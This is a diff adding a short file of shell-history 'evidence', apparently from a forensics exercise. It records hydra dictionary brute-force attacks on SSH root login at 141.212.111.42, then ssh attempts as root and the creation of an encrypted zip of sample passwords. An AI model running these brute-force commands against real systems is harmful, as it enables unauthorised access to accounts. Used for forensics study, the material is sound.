@@ -1,0 +1,47 @@
+//===========================================================================evidence 1
+
+sudo ifconfig wlan0 
+141.212.111.41
+sudo ifconfig eth0 
+141.212.111.41
+ssh 141.212.111.42
+./hydra
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+./hydra -l root -p test 141.212.111.42 ssh2
+./hydra -l root -p test 141.212.111.42 ssh2 -v
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+./hydra
+ssh 141.212.111.42
+ssh 141.212.111.42 -l root
+vi hydra-ssh2.c 
+
+
+//============================================================================evidence 2
+sudo ifconfig eth0 
+141.212.111.41
+./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+LD_LIBRARY_PATH=~/lib ./hydra -l root -P /usr/share/dict/words -f 141.212.111.42 ssh2 -v
+./hydra -R
+LD_LIBRARY_PATH=~/lib ./hydra -R
+cat passwords.txt 
+echo "enigma" > password1.txt
+echo "love" > password2.txt
+echo "supersecret" > password3.txt
+echo "KERMIT" > password4.txt
+echo "eeMeisei700x" > password5.txt
+rm passwords.txt 
+zip passwords.zip password*txt -e
+rm password*.txt
+unzip -l passwords.zip 
+unzip passwords.zip 
+cd hydra-5.4-src/
+LD_LIBRARY_PATH=~/lib ./hydra
+ifconfig
+sudo ifconfig eth0 
+141.212.111.41
+LD_LIBRARY_PATH=~/lib ./hydra -l root -P ~/Desktop/password.lst 141.212.111.42 ssh2
+ssh 141.212.111.42
+ssh 141.212.111.42 -l root
+*local/nefarious-laptop:/tmp/.ICE-unix/2683
+MIT-MAGIC-COOKIE-1
